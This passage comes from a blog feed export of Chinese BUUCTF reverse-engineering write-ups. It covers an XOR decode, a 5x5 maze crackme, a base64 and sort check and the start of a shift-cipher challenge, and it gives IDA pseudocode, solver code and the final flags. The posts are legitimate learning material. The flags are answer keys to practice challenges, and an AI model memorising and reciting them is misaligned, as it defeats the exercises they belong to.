<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="number">101011</span> <span class="variable">XOR</span> <span class="number">111111</span> <span class="operator">=</span> <span class="number">010100</span>  <span class="operator">//</span>将<span class="number">101011</span>与<span class="number">111111</span>异或</span><br><span class="line"><span class="number">010100</span> <span class="variable">XOR</span> <span class="number">111111</span> <span class="operator">=</span> <span class="number">101011</span>  <span class="operator">//</span>将异或所得结果再次与<span class="number">111111</span>异或即可还原原文</span><br></pre></td></tr></table></figure>
<p>所以只需要把<code>global</code>指向的字符串按照题目的方式再次进行一次异或即可得到原文,
原文应该就是<strong>flag</strong></p>
<p>可以在<code>IDA</code>里使用<code>shift+e</code>提取字符数组</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201212053336.png"
alt="image-20220121205312277" />
<figcaption aria-hidden="true">image-20220121205312277</figcaption>
</figure>
<p>解密代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> ciphertext[] =</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="number">0x66</span>, <span class="number">0x0A</span>, <span class="number">0x6B</span>, <span class="number">0x0C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x11</span>,</span><br><span class="line">	  <span class="number">0x78</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x55</span>, <span class="number">0x11</span>, <span class="number">0x70</span>, <span class="number">0x19</span>, <span class="number">0x46</span>, <span class="number">0x1F</span>,</span><br><span class="line">	  <span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x23</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x68</span>, <span class="number">0x0F</span>,</span><br><span class="line">	  <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x4F</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">32</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">		ciphertext[i] ^= ciphertext[i - <span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ciphertext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]不一样的flag</title>
    <url>/2022/01/21/%5BReverse%5D%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/</url>
    <content><![CDATA[<p>无壳, 直接拖进<code>IDA</code>分析, F5查看伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();		<span class="comment">//源程序应该是C++写的, __main()函数调用了一个构造函数, 不管</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);	<span class="comment">//奇怪的数字</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>); <span class="comment">//好家伙, 我输入的就是flag?真够不一样的</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反编译出来的伪代码可读性极差, 花了很长时间写出等效形式的代码,
如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> char_arr[<span class="number">25</span>];</span><br><span class="line">	<span class="type">int</span> x_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> y_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">strncpy</span>(char_arr, <span class="string">&quot;*11110100001010000101111#&quot;</span>, <span class="number">25</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;you can choose one action to execute\n1 up\n2 down\n3 left\n4 right\n:&quot;</span>);</span><br><span class="line">		<span class="type">int</span> temp;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;temp);</span><br><span class="line">		<span class="keyword">switch</span> (temp)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			--x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			++x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			--y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			++y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x_pos &lt; <span class="number">0</span> || x_pos &gt; <span class="number">4</span> || y_pos &lt; <span class="number">0</span> || y_pos &gt; <span class="number">4</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样看结构清晰很多,
就是把<code>*11110100001010000101111#</code>这个字符串排成一个<code>5x5</code>的迷宫</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0  1  2  3  4</span><br><span class="line">   -------------→</span><br><span class="line">0 | *  1  1  1  1</span><br><span class="line">1 | 0  1  0  0  0</span><br><span class="line">2 | 0  1  0  1  0</span><br><span class="line">3 | 0  0  0  1  0</span><br><span class="line">4 ↓ 1  1  1  1  #</span><br><span class="line">横为Y轴,竖为X轴, 0是路, 1是墙,*是起点, #是终点</span><br><span class="line">走出迷宫只需要&quot;下下下右右上上右右下下下&quot;, 即&quot;222441144222&quot;</span><br></pre></td></tr></table></figure>
<p>所以<strong>flag</strong>就是<code>flag&#123;222441144222&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]刮开有奖</title>
    <url>/2022/01/22/%5BReverse%5D%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/</url>
    <content><![CDATA[<p>无壳, 直接拖进<code>IDA</code>分析, F5查看伪代码</p>
<p>主函数很简洁</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  DialogBoxParamA(hInstance, (LPCSTR)<span class="number">0x67</span>, <span class="number">0</span>, DialogFunc, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//玄机就在DialogFunc()函数中</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进<code>DialogFunc()</code>函数, 发现两个作用不明的函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201230027196.png"
alt="image-20220123002708137" />
<figcaption aria-hidden="true">image-20220123002708137</figcaption>
</figure>
<p>把<code>sub_4010F0</code>函数抠出来测试发现它会修改<code>v7[0]</code>、<code>v7[1]</code>以及<code>v8~v16</code>的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4010F0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">	<span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">	<span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">	<span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">	result = a3;</span><br><span class="line">	<span class="keyword">for</span> (i = a2; i &lt;= a3; a2 = i)</span><br><span class="line">	&#123;</span><br><span class="line">		v5 = <span class="number">4</span> * i;</span><br><span class="line">		v6 = *(<span class="type">unsigned</span> <span class="type">long</span>*)(<span class="number">4</span> * i + a1);</span><br><span class="line">		<span class="keyword">if</span> (a2 &lt; result &amp;&amp; i &lt; result)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">do</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (v6 &gt; *(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					++i;</span><br><span class="line">					*(<span class="type">unsigned</span> <span class="type">long</span>*)(v5 + a1) = *(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result);</span><br><span class="line">					<span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">while</span> (*(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * i) &lt;= v6)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (++i &gt;= result)</span><br><span class="line">							<span class="keyword">goto</span> LABEL_13;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					v5 = <span class="number">4</span> * i;</span><br><span class="line">					*(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result) = *(<span class="type">unsigned</span> <span class="type">long</span>*)(<span class="number">4</span> * i + a1);</span><br><span class="line">				&#125;</span><br><span class="line">				--result;</span><br><span class="line">			&#125; <span class="keyword">while</span> (i &lt; result);</span><br><span class="line">		&#125;</span><br><span class="line">	LABEL_13:</span><br><span class="line">		*(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result) = v6;</span><br><span class="line">		sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">		result = a3;</span><br><span class="line">		++i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">11</span>] = &#123; <span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span> &#125;;</span><br><span class="line">	sub_4010F0((<span class="type">int</span>)arr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//51 67 69 72 74 78 83 90 97 103 110</span></span><br><span class="line"><span class="comment">//当作ASCII字符就是&quot;3CEHJNSZagn&quot;</span></span><br><span class="line"><span class="comment">//每一位分别对应v7[0]、v7[1]以及v8~v16的值</span></span><br><span class="line"><span class="comment">//显然sub_4010F0()的作用是升序排序</span></span><br></pre></td></tr></table></figure>
<p><code>sub_401000()</code>函数, 可以根据其中用到的码表推测,
是base64编码函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201230024243.png"
alt="image-20220123002448205" />
<figcaption aria-hidden="true">image-20220123002448205</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201230024194.png"
alt="image-20220123002452161" />
<figcaption aria-hidden="true">image-20220123002452161</figcaption>
</figure>
<p>然后<code>DialogFunc()</code>函数的算法就清晰了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INT_PTR __stdcall <span class="title function_">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">2</span>]; <span class="comment">// [esp+8h] [ebp-20030h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+10h] [ebp-20028h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+14h] [ebp-20024h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+18h] [ebp-20020h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+20h] [ebp-20018h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-20014h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-20010h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-20008h]</span></span><br><span class="line">  CHAR String[<span class="number">65536</span>]; <span class="comment">// [esp+34h] [ebp-20004h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">65536</span>]; <span class="comment">// [esp+10034h] [ebp-10004h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7[<span class="number">0</span>] = <span class="number">90</span>;</span><br><span class="line">      v7[<span class="number">1</span>] = <span class="number">74</span>;</span><br><span class="line">      v8 = <span class="number">83</span>;</span><br><span class="line">      v9 = <span class="number">69</span>;</span><br><span class="line">      v10 = <span class="number">67</span>;</span><br><span class="line">      v11 = <span class="number">97</span>;</span><br><span class="line">      v12 = <span class="number">78</span>;</span><br><span class="line">      v13 = <span class="number">72</span>;</span><br><span class="line">      v14 = <span class="number">51</span>;</span><br><span class="line">      v15 = <span class="number">110</span>;</span><br><span class="line">      v16 = <span class="number">103</span>;</span><br><span class="line">      sub_4010F0((<span class="type">int</span>)v7, <span class="number">0</span>, <span class="number">10</span>);    <span class="comment">//将v7[0]、v7[1]以及v8~v16进行升序排序</span></span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">5</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">7</span>];</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">6</span>];</span><br><span class="line">      v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(v18, <span class="built_in">strlen</span>(v18));  <span class="comment">//对String的5~7位进行base64编码</span></span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">3</span>];</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">2</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">4</span>];</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(v18, <span class="built_in">strlen</span>(v18));  <span class="comment">//对String的2~4位进行base64编码</span></span><br><span class="line">      <span class="keyword">if</span> ( String[<span class="number">0</span>] == v7[<span class="number">0</span>] + <span class="number">34</span>  <span class="comment">//String[0]=&#x27;U&#x27;, v7=&#x27;3&#x27;</span></span><br><span class="line">        &amp;&amp; String[<span class="number">1</span>] == v10         <span class="comment">//String[1]=&#x27;J&#x27;, v10=&#x27;J&#x27;</span></span><br><span class="line">        &amp;&amp; <span class="number">4</span> * String[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * v8    <span class="comment">//String[2]=&#x27;W&#x27;, v8=&#x27;E&#x27;</span></span><br><span class="line">        &amp;&amp; String[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (v13 / <span class="number">9</span>)   <span class="comment">//String[3]=&#x27;P&#x27;, v13=&#x27;Z&#x27;</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)      <span class="comment">//base64解码可知String[5]~String[7]=&quot;jMp&quot;</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )    <span class="comment">//同理String[2]~String[4]=&quot;WP1&quot;</span></span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, (<span class="type">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把<code>String</code>的8位连起来就是<code>UJWP1jMp</code>,
所以<strong>flag</strong>就是<code>flag&#123;UJWP1jMp&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]rome</title>
    <url>/2022/01/25/%5BReverse%5Drome/</url>
    <content><![CDATA[<p>无壳, 拖进<code>IDA</code>, <code>F5</code>查看伪代码,
主函数里面主要就<code>func()</code>函数, 跟到<code>func()</code>里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span 